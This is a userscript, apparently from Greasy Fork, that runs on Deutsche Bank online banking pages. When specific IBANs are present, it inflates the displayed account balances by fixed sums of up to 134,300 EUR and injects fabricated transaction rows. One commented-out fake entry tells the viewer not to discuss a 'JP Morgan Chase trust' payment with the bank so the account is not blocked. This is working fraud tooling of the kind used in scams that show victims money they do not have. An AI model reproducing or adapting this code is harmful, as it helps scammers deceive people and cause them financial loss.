// ==UserScript==
// @name         Ed 4Rec  cm.adam.machwitz@unitybox.de
...
// @downloadURL https://update.greasyfork.org/scripts/512561/Ed%204Rec%20%20cmadammachwitz%40unityboxde.user.js
// @updateURL https://update.greasyfork.org/scripts/512561/Ed%204Rec%20%20cmadammachwitz%40unityboxde.meta.js
// ==/UserScript==
...
//         UBERSICHT
    ...
    const accountBalanceAdjustments = [
        ...
        { index: 1, amount: 0 },
         ...
         { index: 2, amount: 134300},  //3   // will have to change to 1395
        { index: 3, amount: 0 },  // 4  //will have to change to app 5700
       { index: 4, amount: 134300},  // 5
         { index: 5, amount: 134300}, //1
         { index: 6, amount:  0},
        { index: 7, amount: 0}, //2
         { index: 8, amount:  0},
        { index: 12, amount: 0 },
        { index: 13, amount: 134300 },
        { index: 14, amount: 134300 },
        { index: 15, amount: 0 },
        { index: 16, amount: 0 },
        { index: 17, amount: 0 },
        { index: 18, amount: 0 },
...
//     UMSATZE BALANCE
    ...
    var adjustValue = 6300.00; // Modify this value as needed

    // Specify the IBAN value to check for
    var ibanCheck = "DE27 3007 0024 0852 2955 00";
...
// UMSATZE TRANSACTIONS
   ...
   //         date: 'Vorgemerkt',
  //          bookingDate: ' ',
   //         purpose: 'Treuhand von JP Morgan Chase. A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.',
   //         debit: '',
   //         credit: '127.246,83',
    //        currency: 'EUR'
    //    },
...
//    // Specify the value to adjust the balance by
    var vvadjustValue = 134300.00; // Modify this value as needed

//    // Specify the IBAN value to check for
    var vvibanCheck = "DE29 3007 0024 0852 2955 61";
    ...
    function isIbanPresent() {
        ...
        if (ibanElement) {
            var ibanText = ibanElement.textContent.replace(/\s+/g, '').toUpperCase();
            var formattedIbanCheck = vvibanCheck.replace(/\s+/g, '').toUpperCase();
            return ibanText.includes(formattedIbanCheck);
        }
        return false;
    }
    ...
    function modifyBalancesEnd() {
        ...
        balanceElements.forEach(function(element) {
            ...
            if (strongTag) {
                var balanceText = strongTag.textContent.trim();
                var balance = parseBalance(balanceText);
                var newBalance = balance + vvadjustValue;
                var formattedBalance = formatBalance(newBalance);
    ...
    // Check document readiness and run modifyBalancesEnd when fully loaded
    var xcheckReadyState = setInterval(function() {
        if (document.readyState === 'complete') {
            clearInterval(xcheckReadyState);
            setTimeout(modifyBalancesEnd, 0);
        }
    }, 100);
}
...
if ((window.location.href.indexOf("deutsche") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0) && window.location.href.indexOf("InstantPayment") === -1) {
    ...
    // Specify the IBAN value to check for
  var ddibanCheck = 'DE29 3007 0024 0852 2955 61';
...
//            currency: 'EUR'
 //       }
    ...
    function isIbanPresent() {
        ...
        if (!ibanElement) return false;
        var pageIban = ibanElement.textContent.replace(/\s+/g, '').toUpperCase();
        var targetIban = ddibanCheck.replace(/\s+/g, '').toUpperCase();
        return pageIban === targetIban;
    }
    ...
    function insertTransactions() {
        ...
        // Check if the original transaction element exists
        var originalTransaction = document.querySelector('.even');
        ...
        // Insert each transaction followed by a spacer
        ddtransactions.forEach(function(transactionDetails, index) {
            var newTransaction = document.createElement('tr');
            newTransaction.className = 'even';
            ...
            // Insert spacer after each transaction (except after the last one)
            if (index < ddtransactions.length - 1) {
                var spacer = createSpacer();
                parent.insertBefore(spacer, originalTransaction);
            }
        });
    ...
    // Wait for 2 seconds before inserting transactions (adjust timing if needed)
        ...
        // Check document readiness and run modifyBalancesEnd when fully loaded
    var ddcheckReadyStates = setInterval(function() {
        if (document.readyState === 'complete') {
            clearInterval(ddcheckReadyStates);
            setTimeout(insertTransactions, 0);
        }
    }, 100);
}
